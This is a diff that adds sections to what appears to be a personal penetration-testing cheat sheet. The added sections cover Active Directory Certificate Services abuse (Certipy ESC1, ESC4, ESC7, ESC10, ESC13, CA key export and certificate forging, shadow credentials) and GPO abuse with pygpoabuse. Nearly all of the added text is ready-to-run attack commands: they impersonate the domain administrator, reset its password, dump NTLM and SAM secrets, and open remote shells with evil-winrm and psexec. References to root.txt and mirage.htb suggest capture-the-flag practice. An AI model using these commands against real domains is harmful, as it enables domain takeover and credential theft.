@@ -124,7 +124,100 @@ ValidatedSPN
 WriteDacl
 WriteOwner
 
-
 # Active Directory: CS
+## Guide
+https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
+
+## .ccache
+impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
+impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme
+
+## Check Availablility
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+
+## Search Vulnerable
+certipy find -k -target $DC -dc-ip $TARGET -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
+
+## AddKeyCredentialLink
+certipy shadow auto -k -target $DC -dc-ip $TARGET -account 'SVC_CABACKUP'
+
+## ESC1
+adminSid=$(certipy account -k -target $DC -dc-ip $TARGET -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -key-size '4096'
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
+change_password administrator 123qweasdF!
+impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm-py -i $TARGET -u 'administrator' -p '123qweasdF!'
+
+## ESC4
+certipy template -k -target $DC -dc-ip $TARGET -template '' -write-default-configuration
+
+## ESC7
+certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -add-officer '$USERNAME'
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'SubCA' -upn 'administrator' -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
+certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -issue-request ''
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -retrieve ''
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'administrator.pfx'
+kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
+
+## ESC10
+certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'DC01$@$DOM'
+certipy req -k -dc-ip $IP -target $DC -ca $CA -template 'User'
+certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'ORIGINAL_UPN@$DOM'
+certipy auth -pfx DC01.pfx -dc-ip $IP -ldap-shell
+set_rbcd DC01$ WRITEABLE_OWNER_USER
+impacket-getST -k -no-pass -dc-ip $IP $DOM/'WRITEABLE_OWNER_USER' -spn 'cifs/DC01.mirage.htb' -impersonate DC01$
+impacket-secretsdump -k -no-pass $DC -just-dc-user Administrator
+
+## ESC13
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'DifferentTemplate' -key-size 4096
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+impacket-reg -dc-ip $TARGET $DOM -k -no-pass backup -o '\programdata'
+evil-winrm --> login --> cd \programdata; download SAM.save ... SECURITY.save ... SYSTEM.save ...
+impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
+impacket-secretsdump DC01$@$DC -hashes '$MACHINE.ACC_HASH' -just-dc-ntlm
+
+## Request
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -dynamic-endpoint
+
+## Forge
+certutil -store my
+certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
+certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator_forged.pfx'
+change_password administrator 123qweasdF!
+impacket-getTGT $DOM/'administrator:123qweasdF!'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
+
+## Authenticate
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
+change_password administrator 123qweasdF!
+impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm -i $TARGET -u administrator -H ''
+
+## Crack
+pfx2john user.pfx
+openssl pkcs12 -in user.pfx -nocerts -out auth.key-enc
+openssl rsa -in auth.key-enc -out auth.key
+openssl pkcs12 -in user.pfx -clcerts -nokeys -out auth.crt
+evil-winrm -i $TARGET -S -k auth.key -c auth.crt
 
 # Active Directory: GPO
+## Get
+Get-GPO -All
+Get-GPO -Name "Default Domain Controllers Policy"
+
+## Permissions
+Get-GPPermission -Name "Default Domain Controllers Policy" -All
+Get-GPPermission -Name "Default Domain Controllers Policy" -TargetName "GPO Managers" -TargetType Group
+
+## Execute
+python3 pygpoabuse.py -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -taskname 'Custom Task' -gpo-id '6ac1786c-016f-11d2-945f-00c04fb984f9'
+gpupdate /force
+impacket-getTGT $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
